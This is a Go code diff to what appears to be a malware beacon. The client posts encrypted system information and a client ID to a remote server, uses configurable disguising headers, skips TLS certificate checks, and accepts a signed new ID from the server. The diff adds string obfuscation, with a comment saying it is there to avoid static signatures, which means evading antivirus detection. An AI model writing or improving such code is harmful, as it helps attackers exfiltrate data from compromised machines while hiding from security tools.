@@ -21,6 +21,15 @@ import (
 	"time"
 )
 
+// HTTP strings (constructed to avoid static signatures)
+var (
+	httpHeaderUserAgent   = string([]byte{0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74})                                     // User-Agent
+	httpHeaderContentType = string([]byte{0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65})                         // Content-Type
+	httpMetaId            = string([]byte{0x69, 0x64})                                                                                     // id
+	httpMetaEncryption    = string([]byte{0x65, 0x6e, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6f, 0x6e})                                     // encryption
+	httpEncRsaAes         = string([]byte{0x72, 0x73, 0x61, 0x2b, 0x61, 0x65, 0x73})                                                       // rsa+aes
+)
+
 // PostData represents the structure of our post request body
 type PostData struct {
 	Data      string            `json:"data"`      // Our encrypted system info
@@ -47,76 +56,65 @@ func parseCustomHeaders(headerJSON string) (map[string]string, error) {
 }
 
 func sendInitialPost(url string, encryptedData string, decrypted map[string]string) (string, error) {
-	// Get the custom POST method from decrypted values
-	method := decrypted["POST Method"] // Ensure this matches exactly
+	method := decrypted[geKeyPostMethod]
 	if method == "" {
-		method = "POST"
+		method = geMethodPost
 	}
 
-	// Create the post data structure
 	postData := PostData{
 		Data: encryptedData,
 		Metadata: map[string]string{
-			"id":         clientID,
-			"encryption": "rsa+aes",
+			httpMetaId:         clientID,
+			httpMetaEncryption: httpEncRsaAes,
 		},
 		Timestamp: time.Now().Unix(),
 	}
 
-	// Convert post data to JSON
 	jsonData, err := json.Marshal(postData)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Create the request with custom method
 	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
-	// Parse and set custom headers
-	customHeaders, err := parseCustomHeaders(decrypted["Custom Headers"])
+	customHeaders, err := parseCustomHeaders(decrypted[geKeyCustomHeaders])
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Set headers
-	req.Header.Set("User-Agent", decrypted["User Agent"])
-	req.Header.Set("Content-Type", decrypted["Content Type"])
+	req.Header.Set(httpHeaderUserAgent, decrypted[geKeyUserAgent])
+	req.Header.Set(httpHeaderContentType, decrypted[geKeyContentType])
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
 
-	// Custom HTTP client
 	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 	client := &http.Client{Transport: tr, Timeout: time.Second * 30}
 
-	// Send request
 	resp, err := client.Do(req)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 	defer resp.Body.Close()
 
-	// Read response body
 	bodyBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
-	// Parse the signed response
 	var signedResponse SignedResponse
 	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Verify the server's signature
 	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
 	hashed := sha256.Sum256([]byte(verificationData))
 
 	// Parse server's public key
-	block, _ := pem.Decode([]byte(decrypted["Public Key"]))
+	block, _ := pem.Decode([]byte(decrypted[geKeyPublicKey]))
 	if block == nil {
 		return "", fmt.Errorf(Err(E18))
 	}
@@ -126,18 +124,15 @@ func sendInitialPost(url string, encryptedData string, decrypted map[string]stri
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Decode signature
 	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Verify signature
 	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
 		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
 	}
 
-	// Return the new client ID if everything is verified
 	if signedResponse.NewClientID == "" {
 		return "", fmt.Errorf(Err(E18))
 	}
